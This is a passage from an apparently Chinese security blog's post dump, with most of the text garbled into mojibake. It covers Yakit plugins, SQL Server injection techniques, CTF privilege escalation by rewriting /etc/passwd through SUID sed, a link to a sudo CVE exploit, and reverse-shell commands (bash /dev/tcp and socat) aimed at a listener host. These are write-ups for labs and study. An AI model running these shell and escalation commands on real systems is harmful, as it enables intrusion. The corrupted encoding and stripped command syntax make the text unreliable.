éå†é€šé“ éå†é€šé“ä¸­çš„æ•°æ®å¯ä»¥ä½¿ç”¨for-rangefor-inè¯­å¥æ¥å®ç°è¿™ä¸€ç‚¹ï¼š for result = range ch // éå†é€šé“å†…çš„æ•°æ® println(fetch chan var [ch] element: , result)//ç­‰åŒäºfor result in ch // éå†é€šé“å†…çš„æ•°æ® println(fetch chan var [ch] element: , result) ç›´æ¥æŒ‡å®šå¾ªç¯æ¬¡æ•° for in n // å¾ªç¯ä½“å°†æ‰§è¡Œnæ¬¡ å¦‚éœ€å½“å‰çš„ç´¢å¼•ï¼š for i in n // å¯ä»¥ä½¿ç”¨å˜é‡iï¼Œå®ƒä»0å¼€å§‹ï¼Œç›´åˆ°n-1 æˆ–ä½¿ç”¨rangeå…³é”®å­—ï¼š for range n // å¾ªç¯ä½“å°†æ‰§è¡Œnæ¬¡ å¦‚æœéœ€è¦ç´¢å¼•ï¼Œå¯ä»¥å°†iå’Œrangeä¸€èµ·ä½¿ç”¨ï¼ˆæ³¨æ„ï¼šrange å‰æœ‰ä¸€ä¸ª =ï¼‰ï¼š for i = range n // å¯ä»¥ä½¿ç”¨å˜é‡iï¼Œå®ƒä»0å¼€å§‹ï¼Œç›´åˆ°n-1 æ’ä»¶Yakitçš„æ’ä»¶åŸºæœ¬å¯ä»¥åˆ†æˆä¸‰ç§ç±»å‹ï¼šäº¤äº’å¼æ’ä»¶(YakåŸç”Ÿæ’ä»¶)ã€MITM æ’ä»¶ã€Codecæ’ä»¶ äº¤äº’å¼æ’ä»¶ç±»ä¼¼äºå•å¼€ä¸€ä¸ªåŠŸèƒ½é¡µé¢ MITM æ’ä»¶ç”¨äºè¢«åŠ¨æ‰«ææ—¶å¯¹æ¼æ´è¿›è¡Œæ£€æµ‹ Codecæ’ä»¶ç”¨äºå¯¹æ•°æ®åŒ…è¿›è¡Œæ“ä½œï¼Œå¯ä»¥è®¾ç½®å³é”®è°ƒç”¨ï¼Œå¯¹HTTPæ•°æ®è¿›è¡Œå˜å½¢ APIYakitæ’ä»¶ç¼–å†™æä¾›çš„API APIæ‰‹å†Œ | Yak Program Language å‡ ä¸ªæ¯”è¾ƒç»å¸¸ç”¨åˆ°çš„API https://yaklang.com/api-manual/api/cli (ç”¨äºè¾“å…¥æ’ä»¶æ‰€éœ€çš„æ•°æ®) https://yaklang.com/api-manual/api/codec (Cryptoç­‰æ“ä½œ) https://yaklang.com/api-manual/api/poc (è·å¾—ã€ä¿®æ”¹æ•°æ®åŒ…ç­‰æ“ä½œ)","tags":["Tolls-Dev"],"categories":["tools"]},{"title":"YunJing-GreatWall2024","path":"/posts/6949a71/","content":""},{"title":"SQL Serverä¸‹SQLæ³¨å…¥çš„åº”ç”¨","path":"/posts/e85eefb/","content":"å†™è¿™ç¯‡æ–‡ç« çš„åŸå› æ˜¯åœ¨æŸæ¬¡HVVæœŸé—´é‡åˆ°äº†ä¸ªASP.NETç«™ç‚¹æ­é…ä½¿ç”¨äº†Microsoft Sql Server,äºæ˜¯æƒ³æ€»ç»“ä¸€ä¸‹SQLIåœ¨SQLServerä¸­çš„ä¸€äº›å§¿åŠ¿ æƒé™åˆ¤æ–­Tipsï¼šåˆ¤æ–­èƒ½å¦å †å åˆ¤æ–­æ˜¯å¦èƒ½å †å æ³¨å…¥å¯ä»¥ä½¿ç”¨ä¸‹é¢è¯­å¥ä½œä¸ºå †å çš„è¯­å¥ï¼Œäººä¸ºè®¾ç½®å“åº”å»¶è¿Ÿä¸æ­£å¸¸å“åº”æ—¶é—´è¿›è¡Œå¯¹æ¯”ä»è€Œåˆ¤æ–­ç¬¬äºŒä¸ªè¯­å¥æ˜¯å¦è¢«æ‰§è¡Œ WAITFOR DELAY 00:00:05; -- æ‰§è¡Œæš‚åœ 5 ç§’é’Ÿ è‹¥å“åº”æ—¶é—´å¤§äºè®¾ç½®çš„å»¶è¿Ÿè¯´æ˜ç¬¬äºŒä¸ªè¯­å¥è¢«æ‰§è¡Œ è‹¥å­˜åœ¨å †å ï¼Œè¿˜å¯ä»¥æ ¹æ®å»¶è¿Ÿçš„æ—¶é—´åˆ¤æ–­ä¼ å…¥çš„è¿™ä¸ªå‚æ•°è¢«å¤šå°‘å¥SQLè¯­å¥ä¸­ä½¿ç”¨ åˆ¤æ–­ç«™åº“åˆ†ç¦» ç«™åº“åˆ†ç¦»ï¼šç½‘ç«™ç¨‹åºå’Œæ•°æ®åº“åˆ†åˆ«æ”¾åœ¨äº†ä¸åŒçš„æœåŠ¡å™¨ä¸Š åˆ¤æ–­ç«™åº“åˆ†ç¦»å¯ä»¥é€šè¿‡åˆ¤æ–­å®¢æˆ·ç«¯ä¸»æœºåå’ŒæœåŠ¡ç«¯ä¸»æœºåæ˜¯å¦ä¸€è‡´è¿›è€Œåˆ¤æ–­æ˜¯å¦ä¸ºç«™åº“åˆ†ç¦» è·å–å®¢æˆ·ç«¯ä¸»æœºå SELECT host_name(); è·å–æœåŠ¡ç«¯ä¸»æœºå SELECT @@servername;SELECT serverproperty(MachineName); è‹¥å®¢æˆ·ç«¯ä¸»æœºåä¸æœåŠ¡ç«¯ä¸»æœºåä¸€è‡´åˆ™ç«™åº“ä¸åˆ†ç¦»ï¼Œä¸ä¸€è‡´åˆ™ç«™åº“åˆ†ç¦» åœ¨è¿›è¡Œåˆ¤æ–­æ—¶å¯ä»¥åœ¨æ³¨å…¥ç‚¹åæ·»åŠ æ¡ä»¶,è‹¥æ¡ä»¶ä¸ºçœŸåˆ™ç«™åº“ä¸åˆ†ç¦» AND host_name()=@@servername æŸ¥æ‰¾ç«™ç‚¹è·¯å¾„å¯ä»¥é€šè¿‡IISçš„é…ç½®æ–‡ä»¶applicationHost.config C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config å¤„ç†ä¸­æ–‡SQL Serverä¸­ASCII ()å‡½æ•°è¿›è¡Œäº†è¯´æ˜ğŸ‘‰ASCII (Transact-SQL) - SQL Server | Microsoft Learn ASCII æ˜¯ä¸€ä¸ª 7 ä½å­—ç¬¦é›†ã€‚ æ‰©å±•çš„ ASCIIï¼ˆæˆ–ç§° High ASCIIï¼‰æ˜¯ä¸ç”± ASCII å‡½æ•°å¤„ç†çš„ 8 ä½å­—ç¬¦é›†ï¼Œ ASCII å‡½æ•°èƒ½å¤Ÿè¯»å–å‰ 7 ä½çš„æµï¼Œè€Œä¸åŒ…æ‹¬å‰©ä½™çš„ 1 ä½ã€‚ UNICODE å‡½æ•°æ”¯æŒè¿”å›æ­£ç¡®çš„å­—ç¬¦ç ä½ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨å®ƒæ¥æ‰¾åˆ°å­—ç¬¦ Ã¦ çš„æ­£ç¡®ç ä½ã€‚å¹¶å¯é€šè¿‡NCHARå‡½æ•°æ¢å¤ä¸ºå­—ç¬¦ ä½†å€¼å¾—æ³¨æ„çš„æ˜¯åœ¨ SQL Server ä¸­ï¼Œå­—ç¬¦ä¸²å­—é¢é‡é»˜è®¤ä½¿ç”¨æ•°æ®åº“çš„é»˜è®¤å­—ç¬¦é›†è¿›è¡Œå¤„ç†ï¼Œåœ¨é‡åˆ°æ•°æ®åº“ä½¿ç”¨å­—ç¬¦é›†ä¸­ä¸å­˜åœ¨å­—ç¬¦æ—¶ï¼Œæ— è®ºä½¿ç”¨ UNICODE å‡½æ•°è¿˜æ˜¯è½¬åŒ–ä¸º16è¿›åˆ¶ä¾æ—§ä¼šè½¬åŒ–æˆéé¢„æœŸç»“æœ å¹¶ä¸”ä¸€æ—¦å†™å…¥æ•°æ®åº“ï¼Œå³ä½¿ä½¿ç”¨ å¦‚ï¼šCAST(MyColumn AS nvarchar(MAX)) å°† åˆ— MyColumn æ˜¾å¼åœ°è½¬æ¢ä¸º nvarchar ç±»å‹ä¹Ÿæ— æ³•æ¢å¤ [!TIP] è‹¥éœ€è¦åœ¨ä¸æ”¹å˜æ•°æ®åº“çš„é»˜è®¤å­—ç¬¦é›†æƒ…å†µä¸‹ï¼Œèƒ½ä½¿ç”¨UNICODE å‡½æ•°æˆ–è½¬16è¿›åˆ¶æ—¶æ­£ç¡®è½¬åŒ–ï¼Œå»ºè®®å¤§å®¶è¿™é‡Œæ ¹æ®æƒ…å†µå°†éœ€è¦è¯»çš„åˆ—è®¾ç½®ä¸º nvarchar ç±»å‹ ä¾‹å¦‚ï¼šåœ¨å­—ç¬¦é›†Chinese_PRC_CI_ASä¸‹ SELECT UNICODE(Ã¦) ç»“æœä¸º63è€Œé230 åœ¨è®¾ç½®åˆ—ä¸ºnvarchar ç±»å‹çš„å‰æä¸‹ï¼Œå¯¹äºä¸­æ–‡çš„å¤„ç†å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ å°†ä¸­æ–‡ä½¿ç”¨è½¬åŒ–ä¸ºUNICODEå‡½æ•°è½¬åŒ–ï¼Œå†é€šè¿‡NCHARå‡½æ•°æ¢å¤ä¸ºä¸­æ–‡ ä¾‹å¦‚ï¼š SELECT UNICODE(SUBSTRING((SELECT entry_value FROM daily_back WHERE id = 16), 1, 1)) å°†ä¸­æ–‡è½¬åŒ–ä¸º16è¿›åˆ¶ï¼Œå†é€šè¿‡CyberChefçš„Recipeä¸ºFrom Hex - Decode textç¼–ç æ–¹å¼é€‰æ‹©ä¸ºUTF-16LEæ¢å¤ä¸ºä¸­æ–‡ ä¾‹å¦‚ï¼š SELECT CONVERT(varchar(max), CONVERT(varbinary(max), (SELECT entry_value FROM daily_back WHERE id = 16)), 2); ç”±äºä¸­æ–‡å¯¹åº”çš„UNICODEä¼šå¾ˆå¤§å¾ˆå¤§ï¼Œè¿™é‡Œæ›´æ¨èä½¿ç”¨16è¿›åˆ¶è¿›è¡Œã€‚ä¸å«Œéº»çƒ¦ä¹Ÿå¯ä»¥æŠŠUNICODEè½¬åŒ–ä¸ºåå…­è¿›åˆ¶","tags":["CTF-Web","Web-SQL"],"categories":["web"]},{"title":"æ˜¥ç§‹äº‘é•œ-Certify","path":"/posts/c964b814/","content":"Certify é¶æ ‡ä»‹ç»ï¼š Certifyæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰4ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–‘ â–‘â–ˆâ–ˆâ–‘ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘ â–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘ â–‘â–‘ â–‘â–‘ â–‘â–‘ â–‘â–‘ è€ä¹ æƒ¯ ________ _______ ________ _________ ___ ________ ___ ___ |\\ ____\\|\\ ___ \\ |\\ __ \\|\\___ ___\\\\ \\|\\ _____\\\\ \\ / /|\\ \\ \\___|\\ \\ __/|\\ \\ \\|\\ \\|___ \\ \\_\\ \\ \\ \\ \\__/\\ \\ \\/ / / \\ \\ \\ \\ \\ \\_|/_\\ \\ _ _\\ \\ \\ \\ \\ \\ \\ \\ __\\\\ \\ / / \\ \\ \\____\\ \\ \\_|\\ \\ \\ \\\\ \\| \\ \\ \\ \\ \\ \\ \\ \\_| \\/ / / \\ \\_______\\ \\_______\\ \\__\\\\ _\\ \\ \\__\\ \\ \\__\\ \\__\\__/ / / \\|_______|\\|_______|\\|__|\\|__| \\|__| \\|__|\\|__|\\___/ / \\|___|/ flag02: flag04484084-cc7b-40d2-8be1-fabd519f22a5Yes, you have enumerated smb. But do you know what an SPN is?","categories":["WriteUp"]},{"title":"Webshellææƒ","path":"/posts/6f44101f/","content":"SUIDææƒç®€ä»‹åœ¨Linuxä¸­suidå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥åˆ©ç”¨suidææƒçš„æ ¸å¿ƒå°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„suidçš„æ–‡ä»¶ é¢˜ç›®[æ¹–æ¹˜æ¯ 2021 final]Penetratable è¿™é¢˜å¾ˆæœ‰æ¸—é€çš„æ„Ÿè§‰ï¼Œå»ºè®®å½“æˆæ¸—é€é¢˜ç›®æ¥åš å¯ä»¥å…ˆæ‰«æä¸€ä¸‹ â”Œâ”€â”€(wellsã‰¿XiaoWEI)-[~]â””â”€$ sudo dirsearch -u http://node4.anna.nssctf.cn:28571//usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460Output File: /home/wells/reports/http_node4.anna.nssctf.cn_28571/__25-03-27_21-36-09.txtTarget: http://node4.anna.nssctf.cn:28571/[21:36:09] Starting:[21:36:14] 403 - 288B - /.ht_wsr.txt[21:36:14] 403 - 288B - /.htaccess.bak1[21:36:14] 403 - 288B - /.htaccess.orig[21:36:14] 403 - 288B - /.htaccess_extra[21:36:14] 403 - 288B - /.htaccess.sample[21:36:14] 403 - 288B - /.htaccess.save[21:36:14] 403 - 288B - /.htaccessBAK[21:36:14] 403 - 288B - /.htaccess_sc[21:36:14] 403 - 288B - /.htaccess_orig[21:36:14] 403 - 288B - /.htaccessOLD[21:36:14] 403 - 288B - /.htaccessOLD2[21:36:14] 403 - 288B - /.htm[21:36:14] 403 - 288B - /.html[21:36:14] 403 - 288B - /.htpasswds[21:36:14] 403 - 288B - /.httr-oauth[21:36:14] 403 - 288B - /.htpasswd_test[21:36:15] 403 - 288B - /.php[21:36:28] 301 - 335B - /app - http://node4.anna.nssctf.cn:28571/app/[21:36:28] 200 - 520B - /app/[21:36:33] 301 - 338B - /config - http://node4.anna.nssctf.cn:28571/config/[21:36:33] 200 - 487B - /config/[21:36:53] 200 - 0B - /phpinfo.php[21:36:59] 403 - 288B - /server-status/[21:36:59] 403 - 288B - /server-status[21:37:03] 301 - 338B - /static - http://node4.anna.nssctf.cn:28571/static/ æœ‰ä¸€ä¸ªphpinfo.phpä½†ç›´æ¥è®¿é—®æ²¡æœ‰ä»»ä½•ä¸œè¥¿ å›åˆ°ä¸»é¢˜é¡µé¢æ¥ é€šè¿‡ä¿®æ”¹idå‚æ•°å¯ä»¥çŸ¥é“æœ‰ä¸¤ä¸ªç”¨æˆ·ä¸€ä¸ªrootä¸€ä¸ªadminï¼Œå°è¯•æ„é€ æ³¨å…¥ç­‰ä¹Ÿæ²¡æœ‰ä»»ä½•æ”¶è· åœ¨findsomethingä¸­èƒ½æ‰¾åˆ°å·²çŸ¥çš„è·¯ç”± /?c=admin/?c=adminm=updatePass/?c=appm=login/?c=appm=register/?c=appm=signOut/?c=root/?c=rootm=downloadRequestLogfilename=/?c=rootm=getLogList/?c=rootm=getUserInfo/?c=user/?c=userm=updateUserInfo å°è¯•ç›´æ¥ç™»å½•/?c=adminå’Œ/?c=rootä¼šæç¤ºæ²¡æœ‰æƒé™ å°è¯•æ³¨å†Œä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·ï¼Œç™»å½•è¿›å»åä¼šå‘ç°æœ‰ä¿®æ”¹å¯†ç çš„åŠŸèƒ½ è¿™é‡Œå¯ä»¥ä¿®æ”¹è‡ªå·±çš„å¯†ç ï¼Œæƒ³è¶Šæƒåˆ°ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„å¯†ç  å°è¯•æŠ“åŒ…ä¿®æ”¹ å‘ç°æˆåŠŸä¿®æ”¹adminçš„å¯†ç ï¼Œä½†åœ¨ä¿®æ”¹rootçš„æ—¶å€™è¢«æç¤ºæ²¡æœ‰æƒé™ è¿™é‡ŒçŒœæµ‹å¯ä»¥é€šè¿‡/?c=adminm=updatePassè¿™ä¸ªè·¯ç”±è¿›è¡Œä¿®æ”¹rootç”¨æˆ·çš„å¯†ç  ç™»å½•adminç”¨æˆ·ï¼ŒæŸ¥çœ‹/?c=adminm=updatePassä¸­æ‰€éœ€è¦çš„å‚æ•° /static/js/req.js function updatePass() // let name=encodeURIComponent(Base64.encode($(.input-groupinput).eq(0).val())) // let oldPass=$(.input-groupinput).eq(1).val()?hex_md5($(.input-groupinput).eq(1).val()):; // let newPass=$(.input-groupinput).eq(2).val()?hex_md5($(.input-groupinput).eq(2).val()):; // let saying=encodeURIComponent(Base64.encode($(.input-groupinput).eq(3).val())) // $.ajax( // url: /?c=adminm=updatePass, // type: post, // data: name=+name+newPass=+newPass+oldPass=+oldPass+saying=+saying, // // async:true, // dataType: text, // success: function(data) // alertHandle(data); // // ); å°è¯•ä½¿ç”¨è¿™ä¸ªè¢«æ³¨é‡Šçš„è·¯ç”±ï¼Œé€šè¿‡è¿™ä¸ªè·¯ç”±æˆåŠŸä¿®æ”¹rootçš„å¯†ç  ç™»å½•è¿›rootçš„é¢æ¿å‘ç°æœ‰ä¸ªlogçš„æ–‡ä»¶ï¼Œä¸/?c=rootm=downloadRequestLogfilename=ä¸ä¹‹å¯¹åº”ï¼Œå‘ç°æœ‰ä¸ªç›®å½•ç©¿è¶Šï¼Œå‘ç°åœ¨æ ¹ç›®å½•æœ‰flagæ–‡ä»¶ä½†æ— æ³•è¯»å–ï¼Œåº”è¯¥æ˜¯éœ€è¦ææƒçš„ è¿™è¾¹çŠ¯å‚»äº†ï¼ŒæŠŠæ‰€æœ‰æ–‡ä»¶éƒ½çœ‹äº†ä¸€éè¿˜ä»¥ä¸ºåœ¨ä¸»ä½“ä»£ç æœ‰ä»€ä¹ˆrceæ¼æ´ï¼Œåé¢æ‰æ³¨æ„åˆ°æœ€å¼€å§‹æ‰«åˆ°çš„phpinfo.phpè¿™ä¸ªæ–‡ä»¶ã€‚ã€‚ã€‚ é€šè¿‡CMD5æŸ¥è¯¢åˆ°Webshellçš„å¯†ç ä¸º1q2w3e åå¼¹ä¸ªshellåæŸ¥çœ‹ä¸€ä¸‹flagçš„æ–‡ä»¶æƒé™ -r-------- 1 root root 45 Mar 27 15:20 flag çœ‹æ¥æ˜¯è¦ææƒï¼Œå…ˆçœ‹ä¸€ä¸‹suidææƒ www-data@6aae652213e24b63:/var/www/html$ find / -perm -u=s -type f 2/dev/null/bin/su/bin/sed/bin/umount/bin/mount/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/gpasswd/usr/bin/chfn/usr/lib/openssh/ssh-keysign å‘ç°æœ‰sedï¼Œå°è¯•ä½¿ç”¨sedæ›¿æ¢/etc/passwdä¸­å¯†ç çš„éƒ¨åˆ† www-data@6aae652213e24b63:/var/www/html$ perl -le print crypt(test,addedsalt)adMpHktIn0tR2www-data@6aae652213e24b63:/var/www/html$ sed -i s/root:x/root:adMpHktIn0tR2/g /etc/passwdwww-data@6aae652213e24b63:/var/www/html$ suPassword: root@6aae652213e24b63:/var/www/html# cat /flagNSSCTF689a8f95-ec99-490e-8dbf-65f9df21d716 SUDOææƒsudo -l https://gtfobins.github.io/ CVEææƒSUDO CVECVE-2021-3156å½±å“èŒƒå›´ 1.8.21.8.31p2ä¸‹çš„æ‰€æœ‰æ—§ç‰ˆæœ¬sudoï¼Œä»¥åŠ1.9.01.9.5p1çš„æ‰€æœ‰ç¨³å®šç‰ˆsudo exp https://github.com/Rvn0xsy/CVE-2021-3156-plus# ä¾‹å­ [NSSRound#18 Basic]Becomeroot","categories":["penetration"]},{"title":"ç®€å•shellå‡çº§äº¤äº’å¼","path":"/posts/a75a4ee7/","content":"ç”±äºè„šæœ¬è¯­è¨€é»˜è®¤æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œæ˜¯æ²¡æœ‰è·å– tty çš„ å½“Webshellåå¼¹åˆ°æœåŠ¡å™¨ä¸Šæ—¶ç»å¸¸éƒ½æ˜¯éäº¤äº’å¼çš„ï¼Œå…·ä½“è¡¨ç°ä¸ºæ§åˆ¶ç¬¦å˜æˆäº†è½¬ä¹‰åºåˆ—ã€‚åœ¨æŸäº›æ—¶å€™å°±å¾ˆéš¾ä¸‹ä¸€æ­¥æ“ä½œäº†ï¼Œæ¯”å¦‚éœ€è¦ä½¿ç”¨vimæ—¶æ˜¾ç¤ºä¸€å †çš„æ§åˆ¶ç¬¦ï¼Œåœ¨Ctrl+Cæ—¶å´é€€å‡ºäº†Shell å‡çº§Shellä¸ºäº¤æ¢å¼çš„å°Tipï¼špython pty æ–¹å¼ å‰ææ¡ä»¶æ˜¯ç›®æ ‡ä¸»æœºä¸Šéœ€è¦æœ‰python æŸ¥çœ‹ç›‘å¬æœåŠ¡å™¨ç»ˆç«¯å’ŒSTTYä¿¡æ¯ root@localhost:~# echo $TERM xtermroot@localhost:~# stty -a speed 38400 baud; rows 47; columns 160; line = 0;intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = undef; eol2 = undef; swtch = undef; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;lnext = ^V; discard = ^O; min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc è¿™é‡Œæˆ‘ä»¬çš„ç»ˆç«¯ä¿¡æ¯ä¸ºxtermï¼Œsttyçš„è¡Œæ•°(rows)ä¸º47ï¼Œåˆ—æ•°(columns)ä¸º160 åœ¨ç›‘å¬æœåŠ¡å™¨å¼€å¯ç›‘å¬ root@localhost:~# nc -lvp 8077Listening on 0.0.0.0 8077 åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œåå¼¹shellå‘½ä»¤ bash -i /dev/tcp/192.168.1.1/8077 01 è¿™é‡Œæˆ‘ä»¬åå¼¹çš„shellä¸ºbashï¼Œæ­¤æ—¶ç›‘å¬æœåŠ¡å™¨æ”¶åˆ°äº†åå¼¹çš„shell root@ctf:~# nc -lvp 8077Listening on 0.0.0.0 8077Connection received on 1.14.71.254 36490bash: cannot set terminal process group (432): Inappropriate ioctl for devicebash: no job control in this shellwww-data@09010c0e86d04512:/var/www/html$ å¯ç”¨pythonäº¤äº’å¼ www-data@09010c0e86d04512:/var/www/html$ python3 -c import pty; pty.spawn(/bin/bash)ml$ python3 -c import pty; pty.spawn(/bin/bash) æŒ‰ä¸‹Ctrl+Zï¼Œåå°æŒ‚èµ· åˆ·æ–°ç»ˆç«¯ root@ctf:~$ stty raw -echo root@ctf:~$ fg #è¿™ä¸ªæŒ‡ä»¤è¾“å…¥çš„æ—¶å€™ä¸ä¼šå›æ˜¾www-data@09010c0e86d04512:/var/www/html$ reset å¯èƒ½è¿™æ—¶å€™å°±ä¼šæœ‰å¦‚ä¸‹çš„æç¤ºè¯¢é—®ç»ˆç«¯ç±»å‹ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥è¾“å…¥ç»ˆç«¯ä¿¡æ¯ç„¶åå›è½¦ reset: unknown terminal type unknownTerminal type? è‹¥æ— æç¤ºéœ€è¦è®¾ç½® www-data@6aae652213e24b63:/var/www/html$ export TERM=xterm æ ¹æ®è‡ªå·±çš„ç»ˆç«¯ä¿¡æ¯è®¾ç½®å¦‚ä¸‹å‚æ•° $ export SHELL=bash$ stty rows 47 columns 160 socat åå¼¹Shell socatçš„å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥ä»https://github.com/3ndG4me/socat/releasesä¸‹è½½ åœ¨ç›‘å¬æœåŠ¡å™¨å¼€å¯ç›‘å¬ $ socat file:`tty`,raw,echo=0 tcp-listen:8088 è¿™é‡Œçš„9999ä¸ºç›‘å¬çš„ç«¯å£ æŠŠsocatå¯æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œç„¶åæ‰§è¡Œï¼š user@414e07ee65d84196:~$ ./socat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:111.111.111.111:8088 å…¶ä¸­111.111.111.111:9999ä¸ºç›‘å¬æœåŠ¡å™¨çš„IPå’Œç«¯å£","categories":["tips"]},{"title":"æ˜¥ç§‹äº‘é•œ-MagicRelay","path":"/posts/8dd8445/","content":"MagicRelay é¶æ ‡ä»‹ç»ï¼š Legacy Network æ˜¯ä¸€å®¶åœ¨ä¿¡æ¯æŠ€æœ¯é¢†åŸŸæ‹¥æœ‰ 20 å¹´å†å²çš„è€ç‰Œä¼ä¸šï¼Œä¸“æ³¨äºä¸ºä¸­å°å‹å…¬å¸æä¾›ITè§£å†³æ–¹æ¡ˆå’Œæ”¯æŒæœåŠ¡ã€‚ç”±äºé•¿æœŸä¾èµ–äºè¿‡æ—¶çš„åŸºç¡€è®¾æ–½å’Œå†…éƒ¨ç½‘ç»œï¼ŒLegacy Network åœ¨ç°ä»£åŒ–çš„å®‰å…¨é˜²æŠ¤ä½“ç³»æ–¹é¢å­˜åœ¨è®¸å¤šä¸è¶³ï¼Œç‰¹åˆ«æ˜¯åœ¨æƒé™æ§åˆ¶ã€è¿‡æ—¶çš„è½¯ä»¶ã€æœªåŠæ—¶æ›´æ–°è¡¥ä¸ç­‰æ–¹é¢å­˜åœ¨æ˜¾è‘—é—®é¢˜ã€‚ä½ çš„ç›®æ ‡æ˜¯é€šè¿‡æ¸—é€è¿›å…¥è¯¥ç½‘ç»œï¼Œè·å–æ¯å°æœºå™¨çš„æƒé™ï¼Œè¯¥é¶åœºå…±æœ‰ 4ä¸ªFlagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚","categories":["WriteUp"]},{"title":"2024ImaginaryCtf-WEBå¤ç›˜","path":"/posts/25584ce3/","content":"é¶åœºé“¾æ¥ï¼šhttps://2024.imaginaryctf.org/ å®˜æ–¹WPæŒ‡è·¯ï¼šhttps://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/tree/main/Web readme (100 pts) - 978 solves by maple3142 Description Try to read the flag.txt file. é™„ä»¶ï¼šç‚¹å‡»ä¸‹è½½é™„ä»¶ å…ˆçœ‹dockerfile(è™½ç„¶flagåœ¨è¿™è¾¹éœ²å‡ºæ¥äº†)ï¼Œè¿™æ˜¯ä¸ªnodeåç«¯+nginxçš„é…ç½® FROM node:20-bookworm-slimRUN apt-get update \\ apt-get install -y nginx tini \\ apt-get clean \\ rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*WORKDIR /appCOPY package.json yarn.lock ./RUN yarn install --frozen-lockfileCOPY src ./srcCOPY public ./publicCOPY default.conf /etc/nginx/sites-available/defaultCOPY start.sh /start.shENV FLAG=ictfpath_normalization_to_the_rescueENTRYPOINT [/usr/bin/tini, --]CMD [/start.sh] 